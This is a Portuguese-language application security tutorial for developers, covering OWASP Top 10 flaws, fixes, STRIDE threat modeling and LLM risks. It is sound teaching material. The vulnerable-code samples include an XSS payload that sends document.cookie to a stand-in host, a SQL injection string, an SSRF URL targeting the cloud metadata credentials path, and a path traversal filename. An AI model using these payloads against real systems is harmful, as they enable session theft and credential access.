Segurança de aplicações (AppSec)

Ao fim desta página você vai reconhecer as falhas mais comuns em código web, saber corrigi-las e saber pensar em ameaças antes de escrever a primeira linha.

O que é AppSec

AppSec (de Application Security, segurança de aplicações) é a área que cuida para que o software que a empresa escreve não possa ser usado contra ela. Não é sobre firewall nem antivírus: é sobre o código, o desenho da aplicação e as dependências que ela puxa.

Na prática, quem trabalha com AppSec faz quatro coisas: revisa código e arquitetura atrás de falhas, ensina o time de desenvolvimento a evitá-las, escolhe e opera ferramentas que acham falhas automaticamente (isso é a próxima página, DevSecOps) e ajuda a corrigir quando algo é encontrado, seja por um scanner, por um pesquisador externo ou por um incidente.

Dois termos aparecem o tempo todo. Uma vulnerabilidade é um defeito que permite a alguém fazer o que não deveria: ler dados de outro usuário, executar comandos, derrubar o serviço. Um exploit é a forma concreta de aproveitar essa vulnerabilidade, como a requisição HTTP específica que dispara o defeito.

Por que isso importa para quem vem de dev

AppSec é a porta de entrada mais natural para quem programa. Você já lê pull requests, já entende como um request vira query no banco, já sabe o que é um ORM e um template. A diferença é a pergunta que você faz ao ler o código: em vez de "isso funciona?", passa a ser "o que acontece se a entrada for maliciosa?". Times de AppSec contratam gente que sabe conversar com dev, porque a correção quase sempre é feita pelo dev, e convencer alguém a mudar código exige falar a língua dele.

OWASP e o OWASP Top 10

A OWASP (Open Worldwide Application Security Project) é uma fundação sem fins lucrativos que mantém material aberto sobre segurança de software: guias, ferramentas e listas de referência. É a fonte que todo mundo da área cita, e quase todo material dela é gratuito.

O produto mais famoso é o OWASP Top 10: um ranking das dez categorias de risco mais relevantes em aplicações web, montado a partir de dados de testes reais e de uma pesquisa com profissionais. Ele não é um padrão técnico completo; é um documento de conscientização, um "por onde começar". A edição atual é a de 2025 (publicada em novembro de 2025, substituindo a de 2021). Cada categoria agrupa várias CWEs (Common Weakness Enumeration, um catálogo público que dá um número a cada tipo de falha de software, por exemplo CWE-89 é SQL injection).

Armadilha comum

Muito material na internet (e muita vaga) ainda cita a edição de 2021, em que a ordem era diferente: Injection era A03, SSRF tinha categoria própria (A10) e "Vulnerable and Outdated Components" era A06. Quando alguém disser "A03", pergunte de qual edição. E não trate o Top 10 como checklist completo: passar nele não significa que a aplicação é segura.

SQL injection

SQL injection (SQLi) acontece quando dados do usuário são concatenados dentro de uma query SQL, e o banco passa a interpretar parte desses dados como comando. É uma falha antiga, mas ainda aparece em código novo, especialmente em queries "rápidas" escritas à mão fora do ORM.

# Python + sqlite3 / psycopg: VULNERÁVEL
def buscar_usuario(email):
    sql = f"SELECT id, nome FROM usuarios WHERE email = '{email}'"
    return db.execute(sql).fetchall()

# Entrada maliciosa:  ' OR '1'='1
# Query resultante:   SELECT id, nome FROM usuarios WHERE email = '' OR '1'='1'
# Resultado: devolve TODOS os usuários.

A correção é a query parametrizada (também chamada de prepared statement): você manda o texto da query e os valores separadamente para o driver do banco. O banco compila a query primeiro e só depois encaixa os valores, que são tratados sempre como dado, nunca como SQL.

def buscar_usuario(email):
    sql = "SELECT id, nome FROM usuarios WHERE email = %s"   # placeholder do psycopg; no sqlite3 é ?
    return db.execute(sql, (email,)).fetchall()             # valor separado

// Node + pg: mesma ideia
await pool.query("SELECT id, nome FROM usuarios WHERE email = $1", [email]);

Por que isso resolve e "escapar aspas" não? Porque escapar à mão depende de você lembrar todos os casos (codificação de caracteres, contextos numéricos sem aspas, nomes de coluna). A parametrização elimina a classe inteira de bug no ponto certo: na fronteira entre código e dado.

Ponte com o que você já faz

ORMs como SQLAlchemy, Django ORM, Prisma e TypeORM parametrizam por padrão. O risco volta quando você usa as "saídas de emergência": raw(), text(), $queryRawUnsafe, ou interpola nome de coluna para um ORDER BY dinâmico. Nome de coluna não pode ser parâmetro; nesses casos, compare com uma lista fixa de colunas permitidas.

O mesmo raciocínio vale para outras injeções: command injection (montar um comando de shell com entrada do usuário, como os.system("convert " + arquivo); a correção é passar argumentos como lista, subprocess.run(["convert", arquivo]), sem shell=True; isso fecha a injeção de shell, mas um arquivo que começa com - ainda vira opção do programa, a argument injection, então gere o nome no servidor ou valide por lista de permitidos, e use -- antes dos argumentos quando o programa aceitar) e injeção em LDAP, NoSQL ou templates.

XSS (Cross-Site Scripting)

XSS (Cross-Site Scripting) é injeção, só que no navegador: a aplicação coloca dado do usuário dentro do HTML sem tratar, e esse dado vira JavaScript executando na página de outra pessoa. Com isso o atacante pode agir como a vítima: ler dados da tela, fazer requisições autenticadas em nome dela, trocar o e-mail da conta.

Existem três variações: armazenado (o script fica salvo no banco, por exemplo num comentário, e roda para todo mundo que abre a página), refletido (vem num parâmetro da URL e volta na resposta) e baseado em DOM (o próprio JavaScript do front lê algo da URL e escreve na página).

// Express: VULNERÁVEL (XSS refletido)
app.get("/busca", (req, res) => {
  res.send(`<h1>Resultados para ${req.query.q}</h1>`);
});
// /busca?q=<script>fetch('https://evil.example/?c='+document.cookie)</script>

// Front-end: VULNERÁVEL (XSS DOM)
el.innerHTML = comentario.texto;

// CORRIGIDO: deixar o template/framework escapar
res.render("busca", { q: req.query.q });   // EJS com <%= q %> escapa
el.textContent = comentario.texto;          // texto, não HTML

A defesa principal é o output encoding (codificação de saída, também dito "escapar"): transformar caracteres especiais no contexto de destino, como < em &lt; dentro de HTML. React, Vue, Angular, Jinja2 e os templates do Django já fazem isso por padrão. O risco aparece quando alguém desliga a proteção: dangerouslySetInnerHTML, v-html, |safe, innerHTML. Se você realmente precisa renderizar HTML vindo do usuário (um editor rico, por exemplo), passe por um sanitizador como o DOMPurify.

A segunda camada é a CSP (Content Security Policy): um cabeçalho HTTP que diz ao navegador de onde scripts podem ser carregados. Mesmo que um XSS escape, uma CSP bem feita impede o script injetado de rodar.

Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'

Esse cabeçalho bloqueia scripts inline e de domínios externos. Também ajuda marcar o cookie de sessão como HttpOnly (o JavaScript não consegue lê-lo) e Secure (só trafega por HTTPS). Note que isso é defesa em profundidade: várias camadas independentes, para que a falha de uma não seja suficiente para o ataque.

Broken access control e IDOR

Esta é a categoria número 1 do Top 10, e a mais comum em APIs. Primeiro, duas palavras que se confundem: autenticação é provar quem você é (login); autorização é decidir o que você pode fazer depois de provado. A maioria das APIs acerta a autenticação e esquece a autorização objeto por objeto.

IDOR (Insecure Direct Object Reference, referência direta insegura a objeto) é o caso clássico: a API recebe um ID e devolve o objeto sem verificar se ele pertence a quem pediu. Em contexto de API, a OWASP chama a mesma coisa de BOLA (Broken Object Level Authorization).

# FastAPI: VULNERÁVEL — qualquer usuário logado lê qualquer pedido
@app.get("/pedidos/{pedido_id}")
def ver_pedido(pedido_id: int, user = Depends(usuario_logado)):
    return db.get(Pedido, pedido_id)

# CORRIGIDO — a posse é verificada no servidor, na própria query
@app.get("/pedidos/{pedido_id}")
def ver_pedido(pedido_id: int, user = Depends(usuario_logado)):
    pedido = db.query(Pedido).filter_by(id=pedido_id, dono_id=user.id).first()
    if pedido is None:
        raise HTTPException(status_code=404)   # 404, não 403: não confirma que existe
    return pedido
Armadilha comum

"Mas o front só mostra os pedidos do próprio usuário." Não importa: o atacante não usa o seu front, usa curl ou um proxy como o Burp Suite. Esconder botão não é controle de acesso. Trocar IDs sequenciais por UUID dificulta adivinhar, mas também não é controle de acesso; a checagem de posse no servidor continua obrigatória.

Outras variações: escalada vertical (usuário comum chamando DELETE /admin/usuarios/7 porque a rota só checa se está logado) e mass assignment (o endpoint aceita o corpo JSON inteiro e grava no modelo, então o usuário manda "is_admin": true junto). A correção do segundo é declarar explicitamente os campos aceitos, com um schema (Pydantic, Zod) por endpoint.

SSRF (Server-Side Request Forgery)

SSRF acontece quando a aplicação faz uma requisição HTTP para uma URL controlada pelo usuário. O atacante não consegue acessar a rede interna da empresa diretamente, mas o seu servidor consegue, e ele usa o servidor como intermediário. Funcionalidades típicas: "importar imagem por URL", webhooks, gerador de preview de link, conversor de HTML para PDF.

O alvo mais valioso em nuvem é o metadata endpoint: um endereço especial, http://169.254.169.254/, que AWS, GCP e Azure expõem para cada máquina virtual consultar informações sobre si mesma, incluindo, em várias configurações, credenciais temporárias da conta de serviço. Foi um SSRF contra esse endpoint que levou ao vazamento da Capital One em 2019.

# VULNERÁVEL
@app.post("/avatar-por-url")
def avatar(url: str):
    img = requests.get(url, timeout=5).content
    salvar(img)
# url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# MELHOR: allowlist de destino + bloqueio de IPs internos
import ipaddress, socket
from urllib.parse import urlparse

HOSTS_PERMITIDOS = {"images.parceiro.com", "cdn.parceiro.com"}

def validar_url(url: str) -> str:
    u = urlparse(url)
    if u.scheme != "https" or u.hostname not in HOSTS_PERMITIDOS:
        raise ValueError("destino não permitido")
    for info in socket.getaddrinfo(u.hostname, 443):
        ip = ipaddress.ip_address(info[4][0])
        if ip.is_private or ip.is_loopback or ip.is_link_local:
            raise ValueError("destino interno")
    return url

img = requests.get(validar_url(url), timeout=5, allow_redirects=False).content

Por que tantas checagens? Uma allowlist (lista do que é permitido; tudo fora dela é negado) é muito mais forte que uma denylist (lista do que é proibido), porque o atacante tem infinitas formas de escrever um IP interno: 0x7f000001, [::ffff:127.0.0.1], um domínio dele que resolve para 10.0.0.5. Desligar redirects impede que um host permitido redirecione para o interno. Uma brecha que ainda sobra é o DNS rebinding (o DNS responde um IP na validação e outro na requisição); a proteção completa é fixar o IP resolvido na conexão ou fazer as requisições saírem por um proxy de egress isolado. Na nuvem, exija o IMDSv2 da AWS (o metadata exige um token obtido por PUT, o que barra a maioria dos SSRF simples).

Desserialização insegura (breve)

Serializar é transformar um objeto em bytes para guardar ou transmitir; desserializar é o caminho inverso. Alguns formatos guardam não só dados, mas instruções de como reconstruir objetos, e isso permite executar código durante a desserialização. Em Python, pickle.loads() de dado vindo de fora é execução remota de código garantida; o mesmo vale para yaml.load() sem SafeLoader, ObjectInputStream em Java e unserialize() em PHP.

dados = pickle.loads(request.cookies["carrinho"])   # RCE
dados = json.loads(request.cookies["carrinho"])     # JSON só carrega dados
cfg = yaml.safe_load(arquivo)

Regra prática: para dados que cruzam uma fronteira de confiança, use formatos que só representam dados (JSON, Protobuf) e valide o resultado contra um schema. Se precisar garantir que o dado não foi alterado no cliente, assine-o (HMAC, um código de autenticação calculado com uma chave secreta do servidor).

Segredos no código

Um segredo é qualquer valor que dá acesso a algo: senha de banco, chave de API, token de serviço, chave privada. Colocá-los no código-fonte é um dos incidentes mais comuns, e o problema é que o git nunca esquece: apagar a linha num commit novo não remove do histórico.

STRIPE_KEY = "sk_live_51H...xyz"   # vai para todo clone, fork e backup
STRIPE_KEY = os.environ["STRIPE_KEY"]   # injetado pelo ambiente ou por um cofre

Onde guardar: variáveis de ambiente injetadas pela plataforma, ou um secret manager (cofre de segredos, como AWS Secrets Manager, GCP Secret Manager ou HashiCorp Vault, que guarda, controla acesso e registra quem leu cada segredo). Se um segredo vazar, a resposta correta é revogar e gerar outro (rotacionar) primeiro, e só depois limpar o histórico. Robôs varrem o GitHub público e testam chaves em minutos. Detectar segredos antes do push é assunto da próxima página.

Armadilhas de autenticação

Armazenamento de senha

Nunca guarde senha em texto puro, nem com criptografia reversível, nem com hash rápido (MD5, SHA-1, SHA-256 puro). Um hash é uma função de mão única: transforma a senha num valor fixo do qual não dá para voltar. O problema dos hashes rápidos é justamente serem rápidos: uma GPU testa bilhões de SHA-256 por segundo, então um banco vazado é quebrado por força bruta. Use um algoritmo feito para senha, que é lento de propósito e usa salt (um valor aleatório por usuário, misturado à senha, para que duas senhas iguais gerem hashes diferentes): Argon2id (recomendação atual da OWASP), bcrypt ou scrypt.

hash = hashlib.sha256(senha.encode()).hexdigest()

from argon2 import PasswordHasher   # pip install argon2-cffi
ph = PasswordHasher()
hash = ph.hash(senha)           # salt incluso no resultado
ph.verify(hash, tentativa)      # lança exceção se não bater

Rate limit e força bruta

Sem limite de tentativas, o login vira alvo de credential stuffing: o atacante pega listas de e-mail e senha vazadas de outros sites e testa em massa, contando que as pessoas repetem senha. A defesa é rate limiting (limitar quantas requisições um cliente faz por janela de tempo) por IP e por conta, bloqueio progressivo, CAPTCHA depois de algumas falhas e, principalmente, MFA (Multi-Factor Authentication, pedir um segundo fator além da senha, como um app autenticador ou chave física).

Outros cuidados

  • Mensagens de erro iguais para "usuário não existe" e "senha errada", para não permitir descobrir quais e-mails têm conta (user enumeration). Vale também para "esqueci minha senha".
  • Sessão: gere um novo ID de sessão após o login, defina expiração e invalide no logout.
  • JWT (JSON Web Token, token assinado que carrega dados do usuário): valide a assinatura com o algoritmo fixado no servidor, confira exp, iss e aud, nunca aceite alg: none e lembre que o conteúdo é apenas codificado em base64, não criptografado.
  • Política de senha: o NIST SP 800-63B-4 (2025) pede no mínimo 15 caracteres quando a senha é o único fator (8 quando faz parte de MFA), proíbe exigir mistura de tipos de caractere e troca periódica, e manda recusar senhas que aparecem em listas de vazamento.
  • Não invente: prefira a biblioteca de autenticação do framework ou um provedor de identidade a escrever o seu fluxo de login.

Validação de entrada vs codificação de saída

Estas duas ideias se confundem, e a confusão gera bug.

  • Validação de entrada: na chegada do dado, verificar se ele tem o formato esperado e rejeitar o que não tem. Um CEP tem 8 dígitos; uma quantidade é inteiro entre 1 e 99; um status pertence a um enum. Serve para manter a regra de negócio íntegra e reduzir a superfície de ataque.
  • Codificação de saída: no momento de usar o dado num contexto que interpreta texto (HTML, SQL, shell, URL), transformá-lo para que seja tratado como dado nesse contexto.

Por que precisa das duas? Porque validação sozinha não protege um campo de texto livre. O nome "O'Brien" é válido e tem aspas; um comentário pode legitimamente conter <. Você não pode recusar esses valores, mas precisa codificá-los na saída. E o mesmo dado vai para contextos diferentes (HTML, JSON, CSV, SQL), cada um com sua codificação, que só é conhecida no ponto de uso. Resumo: valide na entrada pelo negócio, codifique na saída pelo contexto, e prefira validar com allowlist (o que é aceito) a denylist (o que é proibido).

# Pydantic: validação declarativa na fronteira
class NovoPedido(BaseModel):
    produto_id: int = Field(gt=0)
    quantidade: int = Field(ge=1, le=99)
    cep: str = Field(pattern=r"^\d{8}$")
    model_config = ConfigDict(extra="forbid")   # rejeita campos extras (mass assignment)

Threat modeling com STRIDE

Threat modeling (modelagem de ameaças) é pensar, antes ou durante o design, no que pode dar errado com um sistema e o que fazer a respeito. É barato: uma hora com o time e um quadro branco evita falhas que custariam semanas para corrigir depois, porque falha de desenho (A06) não se resolve com um patch pontual.

O processo cabe em quatro perguntas, popularizadas por Adam Shostack: O que estamos construindo? O que pode dar errado? O que vamos fazer a respeito? Fizemos um bom trabalho?

Para responder a primeira, desenhe um diagrama de fluxo de dados (DFD): caixas para os componentes, setas para os dados que passam entre eles e linhas tracejadas para as fronteiras de confiança, pontos onde o dado muda de "nível de confiança", como da internet para a sua API, ou da API para um serviço de terceiro. A maior parte das ameaças vive nas setas que cruzam essas fronteiras.

Para a segunda, use o STRIDE, um mnemônico criado na Microsoft com seis categorias de ameaça. Cada uma viola uma propriedade de segurança:

LetraAmeaçaPropriedade violadaPergunta para fazer

TTampering (adulteração)IntegridadeAlguém consegue alterar dados em trânsito ou em repouso?
RRepudiation (repúdio)Não repúdioAlguém consegue fazer algo e depois negar, por falta de registro?

Exemplo trabalhado: API de upload de documentos

Sistema: usuários enviam PDFs de comprovante para uma API; ela grava num bucket de armazenamento de objetos e enfileira um job que gera uma miniatura; o usuário depois baixa o arquivo.

[Navegador] ──HTTPS: POST /uploads (JWT + arquivo)──▶ [API]
- - - - - - - - - fronteira: internet ↔ sistema - - - - - - - - -
[API] ──grava objeto──▶ [Bucket]      [API] ──mensagem──▶ [Fila]
[Fila] ──▶ [Worker de miniatura] ──lê objeto──▶ [Bucket]
[Navegador] ──GET /uploads/{id}──▶ [API] ──URL assinada──▶ [Navegador]

Agora, passe o STRIDE em cada seta que cruza a fronteira:

STRIDEAmeaça concretaMitigação
SToken roubado ou forjado usado para enviar em nome de outro.Validar assinatura e expiração do JWT; expiração curta.
TUsuário envia um HTML ou SVG com script disfarçado de PDF; ou um nome de arquivo ../../etc/cron.d/x (path traversal, sair do diretório esperado usando ../).Checar o tipo pelo conteúdo (magic bytes), não pela extensão; gerar o nome do objeto no servidor (UUID); servir com Content-Disposition: attachment de domínio separado.
RUsuário apaga um comprovante e diz que nunca enviou.Log de auditoria com quem, quando, hash do arquivo.
IGET /uploads/{id} devolve arquivo de outro usuário (IDOR); bucket público.Checagem de posse; bucket privado; URL assinada com expiração de minutos.
DArquivo de 5 GB, ou PDF malicioso que trava o gerador de miniatura (decompression bomb).Limite de tamanho no proxy e na API; rate limit por usuário; worker com timeout e limite de memória.
EFalha no parser de PDF dá execução de código no worker, que tem permissão de escrita no bucket inteiro.Worker isolado em container sem privilégios, só leitura nos originais, credencial com escopo mínimo; biblioteca de PDF atualizada.

Repare no padrão: quase toda mitigação é algo que um dev já sabe implementar. O valor do exercício é a lista, que vira cards no backlog, critérios de aceite e casos de teste.

Checklist de code review seguro

Ao revisar um PR com olhar de segurança, siga o dado: de onde ele vem, por onde passa e onde é usado. Perguntas que pegam a maioria dos problemas:

  • Entrada: todo dado externo (body, query, header, cookie, arquivo, mensagem de fila, resposta de outra API) é validado com schema? Campos extras são rejeitados?
  • Autorização: cada endpoint novo verifica permissão? Cada busca por ID filtra pelo dono ou tenant?
  • Injeção: alguma string concatenada em SQL, shell, template, caminho de arquivo, LDAP ou regex?
  • Saída: algum innerHTML, dangerouslySetInnerHTML, |safe, v-html?
  • Requisições de saída: alguma URL vinda do usuário (SSRF)?
  • Segredos: chave, senha ou token no código, nos testes, no log ou na mensagem de erro?
  • Criptografia: algoritmo caseiro, MD5/SHA-1 para senha, random em vez de secrets para gerar token?
  • Erros: exceção na checagem de permissão nega (fail closed) ou libera? Stack trace vai para o cliente?
  • Logs: eventos de segurança (login, falha, troca de senha, ação administrativa) são registrados? Dado sensível (senha, token, CPF) fica fora do log?
  • Dependências: biblioteca nova é mantida, popular e com nome correto (cuidado com typosquatting, pacotes com nome parecido de propósito, como reqeusts)? Se o nome veio de uma sugestão de IA, o pacote existe mesmo, e quem publica? Modelos inventam nomes de pacote, e atacantes registram esses nomes (slopsquatting).
  • Código gerado por IA: passou pela mesma revisão que o código escrito à mão? Quem pediu o código ao assistente entende o que ele faz?

Para algo mais completo que este checklist existe o OWASP ASVS (Application Security Verification Standard): uma lista grande de requisitos verificáveis, organizada por área (autenticação, sessão, validação, criptografia...) e em três níveis de rigor. O nível 1 é o mínimo para qualquer aplicação; o 3 é para sistemas críticos. É útil como fonte de critérios de aceite ("este endpoint atende ASVS nível 2 em controle de acesso") e como roteiro de estudo. Para consulta rápida por tema, os OWASP Cheat Sheets são curtos e práticos.

E com IA?

Aplicação que usa LLM tem um Top 10 próprio: o OWASP Top 10 para aplicações com LLM, edição 2026. Três itens se ligam direto ao que você viu nesta página:

  • LLM01 Prompt Injection: é a injeção desta página com outra cara. O modelo não separa instrução de dado, então um texto escondido num PDF, numa página ou num e-mail que ele lê pode virar ordem (injeção indireta). Um bom exercício: refazer o STRIDE da API de upload imaginando que um LLM resume o PDF enviado.
  • LLM10 Improper Output Handling: a saída do modelo é entrada não confiável. Escape antes de pôr na página e nunca execute direto como SQL ou comando, senão o XSS e a injeção voltam por outra porta.
  • LLM03 Excessive Agency: agente com ferramentas demais é controle de acesso quebrado. Dê só o que a tarefa pede e exija confirmação humana para ação destrutiva.

Dois cuidados a mais: arquivo de modelo no formato pickle é desserialização insegura (carregar um modelo baixado pode executar código; prefira safetensors), e agentes com ferramentas têm um Top 10 separado, o OWASP Top 10 para Aplicações Agênticas. Mais em SDLC seguro e IA.

Checkpoint

Por que query parametrizada resolve SQL injection melhor do que escapar aspas?

Porque o texto da query e os valores chegam separados ao banco: a query é compilada antes, e o valor é sempre tratado como dado. Escapar à mão depende de cobrir todos os contextos e codificações, e um único esquecimento reabre a falha.

Um endpoint GET /contas/{id} exige login. Isso basta? O que falta?

Não basta. Login é autenticação; falta autorização no nível do objeto: verificar no servidor que a conta pertence ao usuário (ou ao tenant dele), idealmente filtrando na própria query. Sem isso, é IDOR/BOLA.

Por que o endereço 169.254.169.254 aparece em quase todo relatório de SSRF em nuvem?

É o metadata endpoint das VMs em AWS, GCP e Azure, que pode entregar credenciais temporárias da conta de serviço da máquina. Um SSRF que alcança esse endereço pode virar acesso à conta de nuvem. Mitigação: allowlist de destino, bloqueio de IPs internos e link-local, e IMDSv2 na AWS.

Se a API já valida todas as entradas, ainda é preciso codificar a saída?

Sim. Validação garante formato de negócio, mas dados legítimos podem conter caracteres perigosos (aspas, <), e o mesmo dado vai para contextos diferentes. A codificação no ponto de uso, pelo contexto (HTML, SQL, shell), é o que impede injeção.

No threat model da API de upload, qual letra do STRIDE cobre "o worker de miniatura tem permissão de escrita no bucket inteiro" e qual a mitigação?

E (Elevation of privilege): se uma falha no parser der execução de código, o atacante herda permissões amplas demais. A mitigação é o privilégio mínimo: worker isolado, credencial só de leitura nos originais e escrita apenas no prefixo das miniaturas.
